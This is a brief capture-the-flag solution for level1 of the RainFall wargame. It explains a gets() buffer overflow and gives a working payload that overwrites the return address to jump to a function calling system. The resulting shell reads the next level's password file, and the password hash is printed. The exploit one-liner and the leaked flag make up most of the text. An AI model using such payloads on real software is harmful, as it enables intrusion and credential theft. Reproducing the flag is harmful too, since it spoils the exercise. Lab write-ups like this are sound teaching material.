@@ -1,0 +1,17 @@
+To exploit the buffer overflow of the function gets in the main function
+The basic problem is that the function doesn't know how big the buffer is, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given
+
+there are 2 methods: main & run
+main:
+buffer size = 80
+run:
+call system
+
+to execute run:
+- python -c 'print "k"*76 + "\x60\x83\x04\x08"' > /tmp/payload
+- level1@RainFall:~$ cat /tmp/payload - | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+exit
+
